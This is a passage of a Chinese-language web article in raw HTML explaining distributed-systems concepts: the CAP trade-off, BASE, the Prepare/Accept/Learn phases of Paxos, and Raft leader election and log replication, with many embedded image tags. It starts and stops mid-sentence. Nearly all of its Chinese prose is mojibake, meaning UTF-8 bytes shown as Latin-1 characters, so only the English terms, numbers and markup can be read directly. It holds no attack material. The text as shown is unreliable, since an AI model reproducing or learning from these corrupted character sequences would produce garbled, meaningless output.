ç†è®ºå®é™…ä¸Šæ˜¯è¦åœ¨å¯ç”¨æ€§å’Œä¸€è‡´æ€§ä¹‹é—´åšæƒè¡¡ã€‚</p><p>å¯ç”¨æ€§å’Œä¸€è‡´æ€§å¾€å¾€æ˜¯å†²çªçš„ï¼Œå¾ˆéš¾ä½¿å®ƒä»¬åŒæ—¶æ»¡è¶³ã€‚åœ¨å¤šä¸ªèŠ‚ç‚¹ä¹‹é—´è¿›è¡Œæ•°æ®åŒæ­¥æ—¶ï¼Œ</p><ul><li>ä¸ºäº†ä¿è¯ä¸€è‡´æ€§ï¼ˆCPï¼‰ï¼Œä¸èƒ½è®¿é—®æœªåŒæ­¥å®Œæˆçš„èŠ‚ç‚¹ï¼Œä¹Ÿå°±å¤±å»äº†éƒ¨åˆ†å¯ç”¨æ€§ï¼›</li><li>ä¸ºäº†ä¿è¯å¯ç”¨æ€§ï¼ˆAPï¼‰ï¼Œå…è®¸è¯»å–æ‰€æœ‰èŠ‚ç‚¹çš„æ•°æ®ï¼Œä½†æ˜¯æ•°æ®å¯èƒ½ä¸ä¸€è‡´ã€‚</li></ul><h2>å››ã€BASE</h2><p>BASE æ˜¯åŸºæœ¬å¯ç”¨ï¼ˆBasically Availableï¼‰ã€è½¯çŠ¶æ€ï¼ˆSoft Stateï¼‰å’Œæœ€ç»ˆä¸€è‡´æ€§ï¼ˆEventually Consistentï¼‰ä¸‰ä¸ªçŸ­è¯­çš„ç¼©å†™ã€‚</p><p>BASE ç†è®ºæ˜¯å¯¹ CAP ä¸­ä¸€è‡´æ€§å’Œå¯ç”¨æ€§æƒè¡¡çš„ç»“æœï¼Œå®ƒçš„æ ¸å¿ƒæ€æƒ³æ˜¯ï¼šå³ä½¿æ— æ³•åšåˆ°å¼ºä¸€è‡´æ€§ï¼Œä½†æ¯ä¸ªåº”ç”¨éƒ½å¯ä»¥æ ¹æ®è‡ªèº«ä¸šåŠ¡ç‰¹ç‚¹ï¼Œé‡‡ç”¨é€‚å½“çš„æ–¹å¼æ¥ä½¿ç³»ç»Ÿè¾¾åˆ°æœ€ç»ˆä¸€è‡´æ€§ã€‚</p><h2>åŸºæœ¬å¯ç”¨</h2><p>æŒ‡åˆ†å¸ƒå¼ç³»ç»Ÿåœ¨å‡ºç°æ•…éšœçš„æ—¶å€™ï¼Œä¿è¯æ ¸å¿ƒå¯ç”¨ï¼Œå…è®¸æŸå¤±éƒ¨åˆ†å¯ç”¨æ€§ã€‚</p><p>ä¾‹å¦‚ï¼Œç”µå•†åœ¨åšä¿ƒé”€æ—¶ï¼Œä¸ºäº†ä¿è¯è´­ç‰©ç³»ç»Ÿçš„ç¨³å®šæ€§ï¼Œéƒ¨åˆ†æ¶ˆè´¹è€…å¯èƒ½ä¼šè¢«å¼•å¯¼åˆ°ä¸€ä¸ªé™çº§çš„é¡µé¢ã€‚</p><h2>è½¯çŠ¶æ€</h2><p>æŒ‡å…è®¸ç³»ç»Ÿä¸­çš„æ•°æ®å­˜åœ¨ä¸­é—´çŠ¶æ€ï¼Œå¹¶è®¤ä¸ºè¯¥ä¸­é—´çŠ¶æ€ä¸ä¼šå½±å“ç³»ç»Ÿæ•´ä½“å¯ç”¨æ€§ï¼Œå³å…è®¸ç³»ç»Ÿä¸åŒèŠ‚ç‚¹çš„æ•°æ®å‰¯æœ¬ä¹‹é—´è¿›è¡ŒåŒæ­¥çš„è¿‡ç¨‹å­˜åœ¨æ—¶å»¶ã€‚</p><h2>æœ€ç»ˆä¸€è‡´æ€§</h2><p>æœ€ç»ˆä¸€è‡´æ€§å¼ºè°ƒçš„æ˜¯ç³»ç»Ÿä¸­æ‰€æœ‰çš„æ•°æ®å‰¯æœ¬ï¼Œåœ¨ç»è¿‡ä¸€æ®µæ—¶é—´çš„åŒæ­¥åï¼Œæœ€ç»ˆèƒ½è¾¾åˆ°ä¸€è‡´çš„çŠ¶æ€ã€‚</p><p>ACID è¦æ±‚å¼ºä¸€è‡´æ€§ï¼Œé€šå¸¸è¿ç”¨åœ¨ä¼ ç»Ÿçš„æ•°æ®åº“ç³»ç»Ÿä¸Šã€‚è€Œ BASE è¦æ±‚æœ€ç»ˆä¸€è‡´æ€§ï¼Œé€šè¿‡ç‰ºç‰²å¼ºä¸€è‡´æ€§æ¥è¾¾åˆ°å¯ç”¨æ€§ï¼Œé€šå¸¸è¿ç”¨åœ¨å¤§å‹åˆ†å¸ƒå¼ç³»ç»Ÿä¸­ã€‚</p><p>åœ¨å®é™…çš„åˆ†å¸ƒå¼åœºæ™¯ä¸­ï¼Œä¸åŒä¸šåŠ¡å•å…ƒå’Œç»„ä»¶å¯¹ä¸€è‡´æ€§çš„è¦æ±‚æ˜¯ä¸åŒçš„ï¼Œå› æ­¤ ACID å’Œ BASE å¾€å¾€ä¼šç»“åˆåœ¨ä¸€èµ·ä½¿ç”¨ã€‚</p><h2>äº”ã€Paxos</h2><p>ç”¨äºè¾¾æˆå…±è¯†æ€§é—®é¢˜ï¼Œå³å¯¹å¤šä¸ªèŠ‚ç‚¹äº§ç”Ÿçš„å€¼ï¼Œè¯¥ç®—æ³•èƒ½ä¿è¯åªé€‰å‡ºå”¯ä¸€ä¸€ä¸ªå€¼ã€‚</p><p>ä¸»è¦æœ‰ä¸‰ç±»èŠ‚ç‚¹ï¼š</p><ul><li>æè®®è€…ï¼ˆProposerï¼‰ï¼šæè®®ä¸€ä¸ªå€¼ï¼›</li><li>æ¥å—è€…ï¼ˆAcceptorï¼‰ï¼šå¯¹æ¯ä¸ªæè®®è¿›è¡ŒæŠ•ç¥¨ï¼›</li><li>å‘ŠçŸ¥è€…ï¼ˆLearnerï¼‰ï¼šè¢«å‘ŠçŸ¥æŠ•ç¥¨çš„ç»“æœï¼Œä¸å‚ä¸æŠ•ç¥¨è¿‡ç¨‹ã€‚</li></ul><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-2e28af608c6c3a970a27becbbdaf7830_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"635\" data-rawheight=\"373\" class=\"origin_image zh-lightbox-thumb\" width=\"635\" data-original=\"https://pic1.zhimg.com/v2-2e28af608c6c3a970a27becbbdaf7830_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;635&#39; height=&#39;373&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"635\" data-rawheight=\"373\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"635\" data-original=\"https://pic1.zhimg.com/v2-2e28af608c6c3a970a27becbbdaf7830_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-2e28af608c6c3a970a27becbbdaf7830_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>æ‰§è¡Œè¿‡ç¨‹</h2><p>è§„å®šä¸€ä¸ªæè®®åŒ…å«ä¸¤ä¸ªå­—æ®µï¼š[n, v]ï¼Œå…¶ä¸­ n ä¸ºåºå·ï¼ˆå…·æœ‰å”¯ä¸€æ€§ï¼‰ï¼Œv ä¸ºæè®®å€¼ã€‚</p><h3>1. Prepare é˜¶æ®µ</h3><p>ä¸‹å›¾æ¼”ç¤ºäº†ä¸¤ä¸ª Proposer å’Œä¸‰ä¸ª Acceptor çš„ç³»ç»Ÿä¸­è¿è¡Œè¯¥ç®—æ³•çš„åˆå§‹è¿‡ç¨‹ï¼Œæ¯ä¸ª Proposer éƒ½ä¼šå‘æ‰€æœ‰ Acceptor å‘é€ Prepare è¯·æ±‚ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-b89ed9e47cef15c83e61dc97bf1e0fdc_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"538\" data-rawheight=\"475\" class=\"origin_image zh-lightbox-thumb\" width=\"538\" data-original=\"https://pic1.zhimg.com/v2-b89ed9e47cef15c83e61dc97bf1e0fdc_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;538&#39; height=&#39;475&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"538\" data-rawheight=\"475\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"538\" data-original=\"https://pic1.zhimg.com/v2-b89ed9e47cef15c83e61dc97bf1e0fdc_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-b89ed9e47cef15c83e61dc97bf1e0fdc_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>å½“ Acceptor æ¥æ”¶åˆ°ä¸€ä¸ª Prepare è¯·æ±‚ï¼ŒåŒ…å«çš„æè®®ä¸º [n1, v1]ï¼Œå¹¶ä¸”ä¹‹å‰è¿˜æœªæ¥æ”¶è¿‡ Prepare è¯·æ±‚ï¼Œé‚£ä¹ˆå‘é€ä¸€ä¸ª Prepare å“åº”ï¼Œè®¾ç½®å½“å‰æ¥æ”¶åˆ°çš„æè®®ä¸º [n1, v1]ï¼Œå¹¶ä¸”ä¿è¯ä»¥åä¸ä¼šå†æ¥å—åºå·å°äº n1 çš„æè®®ã€‚</p><p>å¦‚ä¸‹å›¾ï¼ŒAcceptor X åœ¨æ”¶åˆ° [n=2, v=8] çš„ Prepare è¯·æ±‚æ—¶ï¼Œç”±äºä¹‹å‰æ²¡æœ‰æ¥æ”¶è¿‡æè®®ï¼Œå› æ­¤å°±å‘é€ä¸€ä¸ª [no previous] çš„ Prepare å“åº”ï¼Œè®¾ç½®å½“å‰æ¥æ”¶åˆ°çš„æè®®ä¸º [n=2, v=8]ï¼Œå¹¶ä¸”ä¿è¯ä»¥åä¸ä¼šå†æ¥å—åºå·å°äº 2 çš„æè®®ã€‚å…¶å®ƒçš„ Acceptor ç±»ä¼¼ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-9f2998a5cf9e637bd89f01d25fa208d9_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"744\" data-rawheight=\"470\" class=\"origin_image zh-lightbox-thumb\" width=\"744\" data-original=\"https://pic2.zhimg.com/v2-9f2998a5cf9e637bd89f01d25fa208d9_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;744&#39; height=&#39;470&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"744\" data-rawheight=\"470\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"744\" data-original=\"https://pic2.zhimg.com/v2-9f2998a5cf9e637bd89f01d25fa208d9_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-9f2998a5cf9e637bd89f01d25fa208d9_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><p>å¦‚æœ Acceptor æ¥æ”¶åˆ°ä¸€ä¸ª Prepare è¯·æ±‚ï¼ŒåŒ…å«çš„æè®®ä¸º [n2, v2]ï¼Œå¹¶ä¸”ä¹‹å‰å·²ç»æ¥æ”¶è¿‡æè®® [n1, v1]ã€‚å¦‚æœ n1 &gt; n2ï¼Œé‚£ä¹ˆå°±ä¸¢å¼ƒè¯¥æè®®è¯·æ±‚ï¼›å¦åˆ™ï¼Œå‘é€ Prepare å“åº”ï¼Œè¯¥ Prepare å“åº”åŒ…å«ä¹‹å‰å·²ç»æ¥æ”¶è¿‡çš„æè®® [n1, v1]ï¼Œè®¾ç½®å½“å‰æ¥æ”¶åˆ°çš„æè®®ä¸º [n2, v2]ï¼Œå¹¶ä¸”ä¿è¯ä»¥åä¸ä¼šå†æ¥å—åºå·å°äº n2 çš„æè®®ã€‚</p><p>å¦‚ä¸‹å›¾ï¼ŒAcceptor Z æ”¶åˆ° Proposer A å‘æ¥çš„ [n=2, v=8] çš„ Prepare è¯·æ±‚ï¼Œç”±äºä¹‹å‰å·²ç»æ¥æ”¶è¿‡ [n=4, v=5] çš„æè®®ï¼Œå¹¶ä¸” n &gt; 2ï¼Œå› æ­¤å°±æŠ›å¼ƒè¯¥æè®®è¯·æ±‚ï¼›Acceptor X æ”¶åˆ° Proposer B å‘æ¥çš„ [n=4, v=5] çš„ Prepare è¯·æ±‚ï¼Œå› ä¸ºä¹‹å‰æ¥æ”¶åˆ°çš„æè®®ä¸º [n=2, v=8]ï¼Œå¹¶ä¸” 2 &lt;= 4ï¼Œå› æ­¤å°±å‘é€ [n=2, v=8] çš„ Prepare å“åº”ï¼Œè®¾ç½®å½“å‰æ¥æ”¶åˆ°çš„æè®®ä¸º [n=4, v=5]ï¼Œå¹¶ä¸”ä¿è¯ä»¥åä¸ä¼šå†æ¥å—åºå·å°äº 4 çš„æè®®ã€‚Acceptor Y ç±»ä¼¼ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-e9871a19edc2ce86be42f40370afce65_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"712\" data-rawheight=\"463\" class=\"origin_image zh-lightbox-thumb\" width=\"712\" data-original=\"https://pic2.zhimg.com/v2-e9871a19edc2ce86be42f40370afce65_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;712&#39; height=&#39;463&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"712\" data-rawheight=\"463\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"712\" data-original=\"https://pic2.zhimg.com/v2-e9871a19edc2ce86be42f40370afce65_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-e9871a19edc2ce86be42f40370afce65_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h3>2. Accept é˜¶æ®µ</h3><p>å½“ä¸€ä¸ª Proposer æ¥æ”¶åˆ°è¶…è¿‡ä¸€åŠ Acceptor çš„ Prepare å“åº”æ—¶ï¼Œå°±å¯ä»¥å‘é€ Accept è¯·æ±‚ã€‚</p><p>Proposer A æ¥æ”¶åˆ°ä¸¤ä¸ª Prepare å“åº”ä¹‹åï¼Œå°±å‘é€ [n=2, v=8] Accept è¯·æ±‚ã€‚è¯¥ Accept è¯·æ±‚ä¼šè¢«æ‰€æœ‰ Acceptor ä¸¢å¼ƒï¼Œå› ä¸ºæ­¤æ—¶æ‰€æœ‰ Acceptor éƒ½ä¿è¯ä¸æ¥å—åºå·å°äº 4 çš„æè®®ã€‚</p><p>Proposer B è¿‡åä¹Ÿæ”¶åˆ°äº†ä¸¤ä¸ª Prepare å“åº”ï¼Œå› æ­¤ä¹Ÿå¼€å§‹å‘é€ Accept è¯·æ±‚ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒAccept è¯·æ±‚çš„ v éœ€è¦å–å®ƒæ”¶åˆ°çš„æœ€å¤§æè®®ç¼–å·å¯¹åº”çš„ v å€¼ï¼Œä¹Ÿå°±æ˜¯ 8ã€‚å› æ­¤å®ƒå‘é€ [n=4, v=8] çš„ Accept è¯·æ±‚ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-d29e4a5e9bc89c187674ebd884a7f571_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"481\" data-rawheight=\"477\" class=\"origin_image zh-lightbox-thumb\" width=\"481\" data-original=\"https://pic2.zhimg.com/v2-d29e4a5e9bc89c187674ebd884a7f571_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;481&#39; height=&#39;477&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"481\" data-rawheight=\"477\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"481\" data-original=\"https://pic2.zhimg.com/v2-d29e4a5e9bc89c187674ebd884a7f571_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-d29e4a5e9bc89c187674ebd884a7f571_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h3>3. Learn é˜¶æ®µ</h3><p>Acceptor æ¥æ”¶åˆ° Accept è¯·æ±‚æ—¶ï¼Œå¦‚æœåºå·å¤§äºç­‰äºè¯¥ Acceptor æ‰¿è¯ºçš„æœ€å°åºå·ï¼Œé‚£ä¹ˆå°±å‘é€ Learn æè®®ç»™æ‰€æœ‰çš„ Learnerã€‚å½“ Learner å‘ç°æœ‰å¤§å¤šæ•°çš„ Acceptor æ¥æ”¶äº†æŸä¸ªæè®®ï¼Œé‚£ä¹ˆè¯¥æè®®çš„æè®®å€¼å°±è¢« Paxos é€‰æ‹©å‡ºæ¥ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-b9a37e5de8950c24bd5275f5253404ef_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"663\" data-rawheight=\"353\" class=\"origin_image zh-lightbox-thumb\" width=\"663\" data-original=\"https://pic4.zhimg.com/v2-b9a37e5de8950c24bd5275f5253404ef_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;663&#39; height=&#39;353&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"663\" data-rawheight=\"353\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"663\" data-original=\"https://pic4.zhimg.com/v2-b9a37e5de8950c24bd5275f5253404ef_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-b9a37e5de8950c24bd5275f5253404ef_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>çº¦æŸæ¡ä»¶</h2><h3>1. æ­£ç¡®æ€§</h3><p>æŒ‡åªæœ‰ä¸€ä¸ªæè®®å€¼ä¼šç”Ÿæ•ˆã€‚</p><p>å› ä¸º Paxos åè®®è¦æ±‚æ¯ä¸ªç”Ÿæ•ˆçš„æè®®è¢«å¤šæ•° Acceptor æ¥æ”¶ï¼Œå¹¶ä¸” Acceptor ä¸ä¼šæ¥å—ä¸¤ä¸ªä¸åŒçš„æè®®ï¼Œå› æ­¤å¯ä»¥ä¿è¯æ­£ç¡®æ€§ã€‚</p><h3>2. å¯ç»ˆæ­¢æ€§</h3><p>æŒ‡æœ€åæ€»ä¼šæœ‰ä¸€ä¸ªæè®®ç”Ÿæ•ˆã€‚</p><p>Paxos åè®®èƒ½å¤Ÿè®© Proposer å‘é€çš„æè®®æœç€èƒ½è¢«å¤§å¤šæ•° Acceptor æ¥å—çš„é‚£ä¸ªæè®®é æ‹¢ï¼Œå› æ­¤èƒ½å¤Ÿä¿è¯å¯ç»ˆæ­¢æ€§ã€‚</p><h2>å…­ã€Raft</h2><p>Raft ä¹Ÿæ˜¯åˆ†å¸ƒå¼ä¸€è‡´æ€§åè®®ï¼Œä¸»è¦æ˜¯ç”¨æ¥ç«é€‰ä¸»èŠ‚ç‚¹ã€‚</p><h2>å•ä¸ª Candidate çš„ç«é€‰</h2><p>æœ‰ä¸‰ç§èŠ‚ç‚¹ï¼šFollowerã€Candidate å’Œ Leaderã€‚Leader ä¼šå‘¨æœŸæ€§çš„å‘é€å¿ƒè·³åŒ…ç»™ Followerã€‚æ¯ä¸ª Follower éƒ½è®¾ç½®äº†ä¸€ä¸ªéšæœºçš„ç«é€‰è¶…æ—¶æ—¶é—´ï¼Œä¸€èˆ¬ä¸º 150ms\\~300msï¼Œå¦‚æœåœ¨è¿™ä¸ªæ—¶é—´å†…æ²¡æœ‰æ”¶åˆ° Leader çš„å¿ƒè·³åŒ…ï¼Œå°±ä¼šå˜æˆ Candidateï¼Œè¿›å…¥ç«é€‰é˜¶æ®µã€‚</p><ul><li>ä¸‹å›¾å±•ç¤ºä¸€ä¸ªåˆ†å¸ƒå¼ç³»ç»Ÿçš„æœ€åˆé˜¶æ®µï¼Œæ­¤æ—¶åªæœ‰ Follower æ²¡æœ‰ Leaderã€‚Node A ç­‰å¾…ä¸€ä¸ªéšæœºçš„ç«é€‰è¶…æ—¶æ—¶é—´ä¹‹åï¼Œæ²¡æ”¶åˆ° Leader å‘æ¥çš„å¿ƒè·³åŒ…ï¼Œå› æ­¤è¿›å…¥ç«é€‰é˜¶æ®µã€‚</li></ul><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-83662c9b61e6591c371f27a838c00e1d_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"825\" data-rawheight=\"435\" data-thumbnail=\"https://pic2.zhimg.com/v2-83662c9b61e6591c371f27a838c00e1d_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"825\" data-original=\"https://pic2.zhimg.com/v2-83662c9b61e6591c371f27a838c00e1d_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;825&#39; height=&#39;435&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"825\" data-rawheight=\"435\" data-thumbnail=\"https://pic2.zhimg.com/v2-83662c9b61e6591c371f27a838c00e1d_b.jpg\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"825\" data-original=\"https://pic2.zhimg.com/v2-83662c9b61e6591c371f27a838c00e1d_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-83662c9b61e6591c371f27a838c00e1d_b.gif\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><ul><li>æ­¤æ—¶ Node A å‘é€æŠ•ç¥¨è¯·æ±‚ç»™å…¶å®ƒæ‰€æœ‰èŠ‚ç‚¹ã€‚</li></ul><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-508122a2f5cf603358d0e13e519c3727_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"825\" data-rawheight=\"435\" data-thumbnail=\"https://pic4.zhimg.com/v2-508122a2f5cf603358d0e13e519c3727_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"825\" data-original=\"https://pic4.zhimg.com/v2-508122a2f5cf603358d0e13e519c3727_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;825&#39; height=&#39;435&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"825\" data-rawheight=\"435\" data-thumbnail=\"https://pic4.zhimg.com/v2-508122a2f5cf603358d0e13e519c3727_b.jpg\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"825\" data-original=\"https://pic4.zhimg.com/v2-508122a2f5cf603358d0e13e519c3727_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-508122a2f5cf603358d0e13e519c3727_b.gif\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><ul><li>å…¶å®ƒèŠ‚ç‚¹ä¼šå¯¹è¯·æ±‚è¿›è¡Œå›å¤ï¼Œå¦‚æœè¶…è¿‡ä¸€åŠçš„èŠ‚ç‚¹å›å¤äº†ï¼Œé‚£ä¹ˆè¯¥ Candidate å°±ä¼šå˜æˆ Leaderã€‚</li></ul><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-b379b76cd0a2e12c44e45d66f9f640cd_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"825\" data-rawheight=\"435\" data-thumbnail=\"https://pic2.zhimg.com/v2-b379b76cd0a2e12c44e45d66f9f640cd_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"825\" data-original=\"https://pic2.zhimg.com/v2-b379b76cd0a2e12c44e45d66f9f640cd_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;825&#39; height=&#39;435&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"825\" data-rawheight=\"435\" data-thumbnail=\"https://pic2.zhimg.com/v2-b379b76cd0a2e12c44e45d66f9f640cd_b.jpg\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"825\" data-original=\"https://pic2.zhimg.com/v2-b379b76cd0a2e12c44e45d66f9f640cd_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-b379b76cd0a2e12c44e45d66f9f640cd_b.gif\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><ul><li>ä¹‹å Leader ä¼šå‘¨æœŸæ€§åœ°å‘é€å¿ƒè·³åŒ…ç»™ Followerï¼ŒFollower æ¥æ”¶åˆ°å¿ƒè·³åŒ…ï¼Œä¼šé‡æ–°å¼€å§‹è®¡æ—¶ã€‚</li></ul><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-c149bfd1560369635d47650d3dfabb09_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"825\" data-rawheight=\"435\" data-thumbnail=\"https://pic2.zhimg.com/v2-c149bfd1560369635d47650d3dfabb09_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"825\" data-original=\"https://pic2.zhimg.com/v2-c149bfd1560369635d47650d3dfabb09_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;825&#39; height=&#39;435&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"825\" data-rawheight=\"435\" data-thumbnail=\"https://pic2.zhimg.com/v2-c149bfd1560369635d47650d3dfabb09_b.jpg\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"825\" data-original=\"https://pic2.zhimg.com/v2-c149bfd1560369635d47650d3dfabb09_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-c149bfd1560369635d47650d3dfabb09_b.gif\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>å¤šä¸ª Candidate ç«é€‰</h2><ul><li>å¦‚æœæœ‰å¤šä¸ª Follower æˆä¸º Candidateï¼Œå¹¶ä¸”æ‰€è·å¾—ç¥¨æ•°ç›¸åŒï¼Œé‚£ä¹ˆå°±éœ€è¦é‡æ–°å¼€å§‹æŠ•ç¥¨ã€‚ä¾‹å¦‚ä¸‹å›¾ä¸­ Node B å’Œ Node D éƒ½è·å¾—ä¸¤ç¥¨ï¼Œéœ€è¦é‡æ–°å¼€å§‹æŠ•ç¥¨ã€‚</li></ul><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-2817dccb8da5a59439f58e211ae7c17b_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"825\" data-rawheight=\"435\" data-thumbnail=\"https://pic4.zhimg.com/v2-2817dccb8da5a59439f58e211ae7c17b_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"825\" data-original=\"https://pic4.zhimg.com/v2-2817dccb8da5a59439f58e211ae7c17b_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;825&#39; height=&#39;435&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"825\" data-rawheight=\"435\" data-thumbnail=\"https://pic4.zhimg.com/v2-2817dccb8da5a59439f58e211ae7c17b_b.jpg\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"825\" data-original=\"https://pic4.zhimg.com/v2-2817dccb8da5a59439f58e211ae7c17b_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-2817dccb8da5a59439f58e211ae7c17b_b.gif\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><ul><li>ç”±äºæ¯ä¸ªèŠ‚ç‚¹è®¾ç½®çš„éšæœºç«é€‰è¶…æ—¶æ—¶é—´ä¸åŒï¼Œå› æ­¤ä¸‹ä¸€æ¬¡å†æ¬¡å‡ºç°å¤šä¸ª Candidate å¹¶è·å¾—åŒæ ·ç¥¨æ•°çš„æ¦‚ç‡å¾ˆä½ã€‚</li></ul><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-4306b9b7a8de676392ea00b780f819d8_b.gif\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"825\" data-rawheight=\"435\" data-thumbnail=\"https://pic1.zhimg.com/v2-4306b9b7a8de676392ea00b780f819d8_b.jpg\" class=\"origin_image zh-lightbox-thumb\" width=\"825\" data-original=\"https://pic1.zhimg.com/v2-4306b9b7a8de676392ea00b780f819d8_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;825&#39; height=&#39;435&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"825\" data-rawheight=\"435\" data-thumbnail=\"https://pic1.zhimg.com/v2-4306b9b7a8de676392ea00b780f819d8_b.jpg\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"825\" data-original=\"https://pic1.zhimg.com/v2-4306b9b7a8de676392ea00b780f819d8_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-4306b9b7a8de676392ea00b780f819d8_b.gif\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>æ•°æ®åŒæ­¥</h2><ul><li>æ¥è‡ªå®¢æˆ·ç«¯çš„ä¿®æ”¹éƒ½ä¼šè¢«ä¼ å…¥ Leaderã€‚æ³¨æ„è¯¥ä¿®æ”¹è¿˜æœªè¢«æäº¤ï¼Œåªæ˜¯å†™å…¥æ—¥å¿—ä¸­ã€‚</li></ul><figure data-size=\"normal\"><noscript><img 